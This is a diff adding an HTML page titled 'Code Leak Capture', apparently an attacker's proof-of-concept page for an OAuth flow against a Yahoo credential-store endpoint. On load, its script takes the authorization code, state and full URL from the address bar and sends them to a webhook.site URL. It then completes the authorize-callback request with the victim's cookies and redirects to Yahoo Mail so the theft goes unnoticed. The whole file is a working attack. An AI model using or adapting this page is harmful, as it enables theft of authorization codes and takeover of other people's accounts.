@@ -1,0 +1,47 @@
+
+        <html>
+        <head>
+            <title>Code Leak Capture</title>
+        </head>
+        <body>
+            <p>Processing...</p>
+            <script>
+                window.onload = function() {
+                    // Get the URL parameters
+                    const urlParams = new URLSearchParams(window.location.search);
+                    const code = urlParams.get('code') || 'No code found';
+                    const state = urlParams.get('state') || 'No state found';
+
+                    // Send the captured data to Webhook
+                    const data = `Code: ${code}, State: ${state}, Full URL: ${window.location.href}`;
+                    fetch('https://webhook.site/8f016836-304a-44d8-aee7-ed7bae810a25?data=' + encodeURIComponent(data))
+                        .then(response => console.log('Data sent to Webhook'))
+                        .catch(error => console.error('Error sending to Webhook:', error));
+
+                    // Prepare the payload for /authorize-callback
+                    const payload = {
+                        "guid": "me",
+                        "serviceProviderId": "b770b078-3fcd-4a17-b26a-7b8c56c2a91b_90f252effa37adb823471101a37a40d4",
+                        "code": code,
+                        "state": state,
+                        "cid": "80u52ctagtp4k22sj5a4208cqo"
+                    };
+
+                    // Send the payload to /authorize-callback to complete the flow
+                    const xhr = new XMLHttpRequest();
+                    xhr.open('POST', 'https://credstore.yahoo.com/v1/users/@me/service-providers/b770b078-3fcd-4a17-b26a-7b8c56c2a91b_90f252effa37adb823471101a37a40d4/authorize-callback', true);
+                    xhr.setRequestHeader('Content-type', 'application/json');
+                    xhr.withCredentials = true;
+                    xhr.onload = function() {
+                        // Redirect to mail.yahoo.com after completing the flow
+                        window.location.href = "https://mail.yahoo.com";
+                    };
+                    xhr.onerror = function() {
+                        window.location.href = "https://mail.yahoo.com";
+                    };
+                    xhr.send(JSON.stringify(payload));
+                };
+            </script>
+        </body>
+        </html>
+        
